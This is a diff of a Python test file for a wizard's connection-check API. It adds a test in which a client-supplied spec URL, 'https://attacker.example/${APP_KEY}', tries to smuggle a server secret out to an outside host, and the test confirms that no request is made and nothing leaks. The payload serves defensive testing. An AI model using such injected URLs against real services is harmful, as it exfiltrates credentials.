@@ -402,22 +402,48 @@ def test_connection_check_reaches_the_target_only_when_the_operator_turns_it_on(
 
     factory = mock_client_factory(lambda _: httpx.Response(200, json=OPENAPI_DOCUMENT))
     monkeypatch.setattr(connection_module, "_default_client", factory)
-    monkeypatch.setenv("APP_URL", "https://app.example")
     monkeypatch.setenv("APP_KEY", PLANTED_SECRET)
     client = TestClient(
         create_app(scripted_interview_handler(), connection_check=operator_enabled)
     )
 
     response = client.post(
-        "/api/v1/wizard/connection/check", json={"binding": http_binding()}
+        "/api/v1/wizard/connection/check",
+        json={"binding": http_binding(spec_url="https://app.example/openapi.json")},
     )
 
     assert response.status_code == 200
     body = response.json()
-    assert body["binding"]["spec_url"] == "${APP_URL}/openapi.json"
     assert body["live"] is operator_enabled
     assert body["status"] == ("checked" if operator_enabled else "unchecked")
     assert len(factory.requests) == (2 if operator_enabled else 0)
+    assert PLANTED_SECRET not in response.text
+
+
+def test_connection_check_never_puts_a_server_variable_into_a_url(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    from metis.wizard.application import connection as connection_module
+
+    factory = mock_client_factory(lambda _: httpx.Response(200, json=OPENAPI_DOCUMENT))
+    monkeypatch.setattr(connection_module, "_default_client", factory)
+    monkeypatch.setenv("APP_KEY", PLANTED_SECRET)
+    client = TestClient(create_app(scripted_interview_handler(), connection_check=True))
+
+    response = client.post(
+        "/api/v1/wizard/connection/check",
+        json={"binding": http_binding(spec_url="https://attacker.example/${APP_KEY}")},
+    )
+
+    body = response.json()
+    probes = {probe["name"]: probe for probe in body["probes"]}
+    assert factory.requests == []
+    assert body["live"] is True
+    assert body["status"] == "unchecked"
+    # the variable probe still reports the server's environment
+    assert probes["APP_KEY"]["message"] == "set"
+    assert not probes["spec_url"]["ok"]
+    assert "metis wizard connect" in probes["spec_url"]["message"]
     assert PLANTED_SECRET not in response.text
 
 
